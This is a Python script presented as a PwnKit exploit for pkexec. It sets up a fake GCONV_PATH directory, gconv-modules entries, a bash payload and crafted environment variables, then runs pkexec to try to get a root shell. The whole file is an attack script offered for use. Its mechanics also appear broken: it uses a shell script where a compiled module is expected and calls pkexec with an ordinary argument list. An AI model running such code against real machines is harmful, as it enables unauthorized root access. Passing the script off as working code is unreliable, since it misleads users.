#!/usr/bin/env python3
import os
import tempfile
import subprocess
import shutil

def pwnkit_exploit():
    print("[+] Starting PwnKit Python Exploit...")
    
    # Create temporary directory
    tmpdir = tempfile.mkdtemp()
    print(f"[+] Created temp directory: {tmpdir}")
    
    try:
        # Create the malicious directory structure
        gconv_path = os.path.join(tmpdir, "GCONV_PATH=.")
        os.makedirs(gconv_path, exist_ok=True)
        
        pwnkit_dir = os.path.join(tmpdir, "pwnkit")
        os.makedirs(pwnkit_dir, exist_ok=True)
        
        # Create the gconv modules configuration
        with open(os.path.join(gconv_path, "pwnkit"), "w") as f:
            f.write("module UTF-8// PWNKIT// pwnkit 2\n")
        
        # Create the malicious shell script that will be executed as root
        shell_script = os.path.join(pwnkit_dir, "shell")
        with open(shell_script, "w") as f:
            f.write("""#!/bin/bash
echo "[+] Root shell activated!"
echo "[+] User: $(whoami)"
echo "[+] UID: $(id)"
echo "[+] Spawning root shell..."
/bin/bash
""")
        
        # Make the shell script executable
        os.chmod(shell_script, 0o755)
        
        # Create the gconv modules file
        gconv_modules = os.path.join(pwnkit_dir, "gconv-modules")
        with open(gconv_modules, "w") as f:
            f.write("""module  UTF-8//    PWNKIT//    pwnkit    2
module  PWNKIT//   UTF-8//    pwnkit    2
""")
        
        # Set up the environment
        env = os.environ.copy()
        env['PATH'] = f"GCONV_PATH={tmpdir}"
        env['SHELL'] = shell_script
        env['CHARSET'] = "PWNKIT"
        env['GIO_USE_VFS'] = ""
        
        print("[+] Triggering pkexec vulnerability...")
        print("[+] If successful, you should get a root shell below:")
        print("-" * 50)
        
        # Trigger the exploit
        subprocess.run(["/usr/bin/pkexec"], env=env)
        
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        # Cleanup
        try:
            shutil.rmtree(tmpdir)
            print(f"[+] Cleaned up temp directory: {tmpdir}")
        except:
            pass

if __name__ == "__main__":
    pwnkit_exploit()
